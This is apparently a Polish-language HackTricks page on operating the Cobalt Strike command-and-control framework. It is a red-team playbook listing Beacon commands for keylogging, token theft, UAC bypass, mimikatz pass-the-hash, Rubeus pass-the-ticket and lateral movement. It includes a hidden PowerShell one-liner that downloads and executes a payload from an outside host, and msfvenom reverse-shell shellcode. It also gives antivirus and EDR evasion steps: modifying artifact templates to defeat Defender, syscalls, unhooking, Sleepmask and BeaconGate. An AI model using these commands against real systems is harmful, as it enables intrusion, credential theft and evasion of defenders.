# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### Listeners C2

`Cobalt Strike -> Listeners -> Add/Edit`, a następnie możesz wybrać, gdzie nasłuchiwać, jakiego rodzaju Beacon używać (http, dns, smb...) i nie tylko.

### Listeners Peer2Peer

Beacony tych listenerów nie muszą komunikować się bezpośrednio z C2 — mogą łączyć się z nim za pośrednictwem innych beaconów.

`Cobalt Strike -> Listeners -> Add/Edit`, a następnie wybierz beacony TCP lub SMB.

* **Beacon TCP ustawi listener na wybranym porcie**. Aby połączyć się z Beaconem TCP, użyj polecenia `connect <ip> <port>` z innego beacona.
* **Beacon SMB będzie nasłuchiwać na pipe o wybranej nazwie**. Aby połączyć się z Beaconem SMB, użyj polecenia `link [target] [pipe]`.

### Generowanie i hostowanie payloadów

#### Generowanie payloadów w plikach

`Attacks -> Packages ->`

* **`HTMLApplication`** dla plików HTA
* **`MS Office Macro`** dla dokumentu Office z makrem
* **`Windows Executable`** dla pliku .exe, .dll lub pliku .exe usługi
* **`Windows Executable (S)`** dla **stageless** pliku .exe, .dll lub pliku .exe usługi (stageless jest lepszy niż staged — mniej IoC)

#### Generowanie i hostowanie payloadów

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` wygeneruje skrypt lub plik wykonywalny do pobrania beacona z Cobalt Strike w formatach takich jak bitsadmin, exe, powershell i python.

#### Hostowanie payloadów

Jeśli masz już plik, który chcesz hostować na serwerze WWW, przejdź do `Attacks -> Web Drive-by -> Host File`, wybierz plik do hostowania i skonfiguruj serwer WWW.

### Opcje Beacona

<details>
<summary>Opcje i polecenia Beacona</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Niestandardowe implanty / Linux Beacons

- Niestandardowy agent musi jedynie komunikować się z protokołem HTTP/S Cobalt Strike Team Server (domyślnym profilem malleable C2), aby się zarejestrować, zgłaszać i odbierać zadania. Zaimplementuj te same URI, nagłówki i szyfrowanie metadanych zdefiniowane w profilu, aby używać interfejsu Cobalt Strike do przydzielania zadań i odbierania wyników.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Skrypt Aggressor (np. `CustomBeacon.cna`) może opakować generowanie payloadu dla Beacona działającego poza Windows, umożliwiając operatorom wybranie listenera i tworzenie payloadów ELF bezpośrednio z GUI.
- Przykładowe procedury obsługi zadań Linux udostępniane Team Server: `sleep`, `cd`, `pwd`, `shell` (wykonywanie dowolnych poleceń), `ls`, `upload`, `download` i `exit`. Są one mapowane na identyfikatory zadań oczekiwane przez Team Server i muszą być zaimplementowane po stronie serwera, aby zwracać wyniki w odpowiednim formacie.
- Obsługę BOF w Linux można dodać, ładując Beacon Object Files wewnątrz procesu za pomocą [ELFLoader od TrustedSec](https://github.com/trustedsec/ELFLoader) (obsługuje również BOF w stylu Outflank), co pozwala uruchamiać modułowe działania post-exploitation w kontekście i z uprawnieniami implantu, bez tworzenia nowych procesów.<sup>[[2]](#references)[[3]](#references)</sup>
  Informacje o formatach loaderów Linux i ograniczeniach granic procesów, wraz z osobnym przykładem przydzielania zadań BOF, znajdziesz w sekcji [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Osadź w niestandardowym Beacone procedurę obsługi SOCKS, aby zachować taką samą obsługę pivotingu jak w Windows Beacons: gdy operator uruchomi `socks <port>`, implant powinien otworzyć lokalne proxy, które przekieruje narzędzia operatora przez przejęty host Linux do sieci wewnętrznych.

## Opsec

### Execute-Assembly

Polecenie **`execute-assembly`** używa **procesu ofiarnego** i zdalnego wstrzykiwania procesu do uruchomienia wskazanego programu. Jest to bardzo głośna technika, ponieważ do wstrzyknięcia kodu do procesu używa się określonych Win API, które są monitorowane przez każdy EDR. Istnieją jednak niestandardowe narzędzia umożliwiające załadowanie kodu w tym samym procesie:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- W Cobalt Strike można też używać BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Skrypt Aggressor `https://github.com/outflanknl/HelpColor` utworzy w Cobalt Strike polecenie `helpx`, które doda kolory do poleceń, wskazując, czy są to BOF-y (zielony), czy używają Frok&Run (żółty) i podobnych technik, czy też ProcessExecution, wstrzykiwania kodu i tym podobnych (czerwony). Ułatwia to określenie, które polecenia są bardziej skryte.

### Nowoczesne post-execution wewnątrz procesu

Nowsze wersje dodają dwie alternatywy na wypadek, gdy klasyczny COFF BOF jest zbyt ograniczony:

- **Beacon Interpreter** kompiluje C na Team Server do pośredniego kodu bajtowego, a następnie wykonuje go w maszynie wirtualnej osadzonej w Beacon. Kod bajtowy pozostaje danymi, a nie natywnym kodem wykonywalnym, dzięki czemu nie trzeba dodatkowo przydzielać pamięci wykonywalnej ani zmieniać uprawnień z RW na RX, co jest zwykle wymagane do załadowania BOF-a. Skrypty mogą importować Beacon API i deklarować prototypy Dynamic Function Resolution (DFR) w stylu BOF.
- **BOF-PE** ładuje kompletny EXE lub DLL do bieżącego Beacon. Ten format obsługuje standardowe importy PE, obsługę wyjątków, bardziej rozbudowany C++ i biblioteki zewnętrzne, zachowując jednocześnie Beacon API. Jest cięższy niż niewielki COFF BOF, więc używaj go tylko wtedy, gdy dodatkowe środowisko uruchomieniowe jest potrzebne.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Te mechanizmy ograniczają sygnały związane z loaderem, ale nie telemetrię generowaną przez działania skryptu ani wywołania Windows API.<sup>[[8]](#references)</sup>

### Działaj jako użytkownik

Możesz sprawdzić zdarzenia, takie jak `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`: 

- Security EID 4624 — sprawdź wszystkie logowania interaktywne, aby poznać typowe godziny pracy.
- System EID 12,13 — sprawdź częstotliwość zamykania, uruchamiania i usypiania systemu.
- Security EID 4624/4625 — sprawdź przychodzące, poprawne i niepoprawne próby uwierzytelnienia NTLM.
- Security EID 4648 — to zdarzenie jest tworzone, gdy do logowania używane są poświadczenia w postaci zwykłego tekstu. Jeśli wygenerował je proces, plik binarny może zawierać poświadczenia w postaci jawnego tekstu w pliku konfiguracyjnym lub w kodzie.

Podczas używania `jump` w Cobalt Strike lepiej skorzystać z metody `wmi_msbuild`, aby nowy proces wyglądał bardziej wiarygodnie.

### Używaj kont komputerów

Obrońcy często sprawdzają nietypowe zachowania generowane przez użytkowników i **wykluczają konta usług oraz konta komputerów, takie jak `*$`, z monitorowania**. Możesz użyć tych kont do ruchu bocznego lub eskalacji uprawnień.

### Używaj payloadów stageless

Payloady stageless generują mniej szumu niż staged, ponieważ nie muszą pobierać drugiego etapu z serwera C2. Oznacza to, że po nawiązaniu początkowego połączenia nie generują ruchu sieciowego, przez co są mniej podatne na wykrycie przez zabezpieczenia sieciowe.

### Tokeny i magazyn tokenów

Zachowaj ostrożność podczas kradzieży lub generowania tokenów, ponieważ EDR może wyliczać tokeny wątków i wykryć **token należący do innego użytkownika** albo nawet do SYSTEM w procesie.

Dzięki temu tokeny można przechowywać **dla każdego beacona**, więc nie trzeba za każdym razem kraść tego samego tokena. Jest to przydatne podczas ruchu bocznego lub gdy trzeba wielokrotnie użyć skradzionego tokena:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Podczas ruchu bocznego zwykle lepiej **ukraść token niż wygenerować nowy** lub przeprowadzić atak pass the hash.

### Guardrails

Cobalt Strike ma funkcję o nazwie **Guardrails**, która pomaga zapobiegać używaniu określonych poleceń lub wykonywaniu działań, które mogą zostać wykryte przez obrońców. Guardrails można skonfigurować tak, aby blokowały konkretne polecenia, takie jak `make_token`, `jump`, `remote-exec` i inne, często używane do ruchu bocznego lub eskalacji uprawnień.

Ponadto repozytorium [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) zawiera też kontrole i pomysły, które warto rozważyć przed wykonaniem payloadu.

### Szyfrowanie ticketów

W środowisku AD zwróć uwagę na szyfrowanie ticketów. Niektóre narzędzia domyślnie używają szyfrowania RC4 dla ticketów Kerberos, które jest mniej bezpieczne niż szyfrowanie AES; aktualne środowiska domyślnie używają AES. Obrońcy monitorujący słabe algorytmy szyfrowania mogą to wykryć.

### Unikaj ustawień domyślnych

Domyślnie w Cobalt Strike nazwy potoków SMB mają postać `msagent_####` i `"status_####`. Zmień te nazwy. Nazwy istniejących potoków można sprawdzić w Cobalt Strike poleceniem: `ls \\.\pipe\`

Ponadto podczas sesji SSH tworzony jest potok o nazwie `\\.\pipe\postex_ssh_####`. Zmień jego nazwę za pomocą `set ssh_pipename "<new_name>";`.

Również podczas ataku post-exploitation potoki `\\.\pipe\postex_####` można zmodyfikować za pomocą `set pipename "<new_name>"`.

W profilach Cobalt Strike możesz też modyfikować takie ustawienia jak:

- Unikanie używania `rwx`
- Sposób działania process injection (używane API) w bloku `process-inject {...}`
- Sposób działania "fork and run" w bloku `post-ex {…}`
- Czas uśpienia
- Maksymalny rozmiar plików binarnych ładowanych do pamięci
- Zajętość pamięci i zawartość DLL w bloku `stage {...}`
- Ruch sieciowy

### Sleepmask i BeaconGate

Sleepmask przekształca Beacon i śledzone przez niego alokacje sterty, gdy jest uśpiony, a następnie przywraca je na czas wykonywania zadań. Aktualne wydania zapewniają domyślnie technikę utrudniającą wykrycie, ale własne BOF-y Sleepmask są nadal przydatne, gdy wymagania dotyczące układu pamięci, alokacji lub stosu wywołań są inne. Od wersji 4.13 domyślny Sleepmask podszywa się również pod adres powrotu dla API pośredniczonych przez BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** rozszerza tę koncepcję poza `Sleep`: wybrane wywołania WinAPI są reprezentowane jako struktury `FUNCTION_CALL` i przekazywane do BOF-a Sleepmask, który może maskować Beacon podczas wykonywania wywołania. Profil może pośredniczyć w grupie (`Comms`, `Core`, `Cleanup` lub `All`) albo tylko w poszczególnych API:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

For API wymienionego w `beacon_gate`, gate ma pierwszeństwo przed `syscall_method`; API niewymienione na liście nadal mogą korzystać ze skonfigurowanej metody syscall. `beacon_gate disable` i `beacon_gate enable` przełączają tę funkcję w czasie działania. Nie włączaj bez zastanowienia opcji `All`: polecenia takie jak `ps` wielokrotnie wywołują `OpenProcess`/`CloseHandle` i mogą powodować skok użycia CPU, gdy każde wywołanie maskuje i demaskuje Beacon. Sleepmask-VS udostępnia mockowany stan Beacon/Sleepmask do debugowania własnych gate’ów bez konieczności wielokrotnego testowania ich za pośrednictwem działającego implantu.<sup>[[9]](#references)</sup>

### Głośne wstrzykiwanie do procesów

Wstrzykiwanie kodu do procesu jest zazwyczaj bardzo głośne, ponieważ **zwykle żaden regularny proces nie wykonuje takiego działania, a sposoby jego realizacji są bardzo ograniczone**. Dlatego może zostać wykryte przez systemy detekcji oparte na zachowaniu. Co więcej, mogą je wykryć również systemy EDR skanujące sieć w poszukiwaniu **wątków zawierających kod, którego nie ma na dysku** (choć jest to częste w procesach takich jak przeglądarki korzystające z JIT). Przykład: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | relacje PID i PPID

Podczas uruchamiania nowego procesu ważne jest **zachowanie typowej relacji rodzic–dziecko** między procesami, aby uniknąć wykrycia. Jeśli `svchost.exe` uruchamia `iexplorer.exe`, będzie to wyglądać podejrzanie, ponieważ w typowym środowisku Windows `svchost.exe` nie jest procesem nadrzędnym dla `iexplorer.exe`.

Gdy Cobalt Strike uruchamia nowy beacon, domyślnie tworzy proces używający **`rundll32.exe`** do uruchomienia nowego listenera. Nie jest to zbyt dyskretne i systemy EDR mogą to łatwo wykryć. Co więcej, `rundll32.exe` jest uruchamiany bez żadnych argumentów, przez co wygląda jeszcze bardziej podejrzanie.

Za pomocą następującego polecenia Cobalt Strike możesz wskazać inny proces do uruchomienia nowego beacona, dzięki czemu będzie on trudniejszy do wykrycia:

```bash
spawnto x86 svchost.exe
```

Możesz też zmienić to ustawienie **`spawnto_x86` i `spawnto_x64`** w profilu.

### Proxyowanie ruchu atakującego

Atakujący czasami muszą mieć możliwość lokalnego uruchamiania narzędzi, nawet na maszynach z Linuxem, i kierowania ruchu ofiar do tych narzędzi (np. w przypadku NTLM relay).

Ponadto czasami podczas ataku pass-the-hash lub pass-the-ticket bardziej stealthy jest **dodanie tego hasha lub biletu do własnego procesu LSASS atakującego** i wykonanie pivotu z niego, zamiast modyfikowania procesu LSASS na maszynie ofiary.

Należy jednak **uważać na generowany ruch**, ponieważ proces backdoora może wysyłać nietypowy ruch (Kerberos?). Możesz w tym celu wykonać pivot do procesu przeglądarki, ale pamiętaj, że możesz zostać wykryty podczas wstrzykiwania się do procesu, więc zastanów się, jak zrobić to stealthy.

### Unikanie AV

#### Obejście AV/AMSI/ETW

Sprawdź stronę:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Zazwyczaj w `/opt/cobaltstrike/artifact-kit` znajdziesz kod oraz wstępnie skompilowane szablony (w `/src-common`) payloadów, których Cobalt Strike użyje do wygenerowania binarnych beaconów.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z wygenerowanym backdoorem (lub po prostu ze skompilowanym szablonem), możesz znaleźć przyczynę wyzwalania alertu przez Defendera. Zwykle jest to ciąg znaków. Możesz więc po prostu zmodyfikować kod generujący backdoora tak, aby ten ciąg nie pojawiał się w wynikowym pliku binarnym.

Po zmodyfikowaniu kodu uruchom `./build.sh` w tym samym katalogu i skopiuj folder `dist-pipe/` do klienta Windows w lokalizacji `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Nie zapomnij załadować agresywnego skryptu `dist-pipe\artifact.cna`, aby wskazać Cobalt Strike, by korzystał z wybranych przez nas zasobów z dysku, a nie z już załadowanych.

#### Resource Kit

Folder ResourceKit zawiera szablony skryptowych payloadów Cobalt Strike, w tym PowerShell, VBA i HTA.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z szablonami, możesz sprawdzić, co nie podoba się programowi Defender (w tym przypadku AMSI), i to zmodyfikować:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modyfikując wykryte linie, można wygenerować szablon, który nie zostanie wykryty.

Nie zapomnij załadować agresywnego skryptu `ResourceKit\resources.cna`, aby poinformować Cobalt Strike, że ma używać wskazanych przez nas zasobów z dysku, a nie już załadowanych.

#### Hooki funkcji | Syscall

Hookowanie funkcji to bardzo popularna metoda wykrywania złośliwej aktywności przez EDR-y. Cobalt Strike pozwala ominąć te hooki, używając **syscalli** zamiast standardowych wywołań Windows API za pomocą konfiguracji **`None`**, używając wersji funkcji `Nt*` z ustawieniem **`Direct`** albo po prostu przeskakując nad funkcją `Nt*` dzięki opcji **`Indirect`** w profilu malleable. Zależnie od systemu jedna z tych opcji może być bardziej stealth niż pozostałe.

Można to ustawić w profilu lub za pomocą polecenia **`syscall-method`**.

Może to jednak również generować dużo szumu.

Jedną z opcji dostępnych w Cobalt Strike do omijania hooków funkcji jest ich usunięcie za pomocą: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Możesz też sprawdzić, które funkcje są hookowane, używając [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) lub [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Różne polecenia Cobalt Strike</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (niestandardowy implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Szablon BOF nix Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Analiza Unit42 szyfrowania metadanych Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Dziennik SANS ISC o ruchu Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Zagubiony w tłumaczeniu](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Przez BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
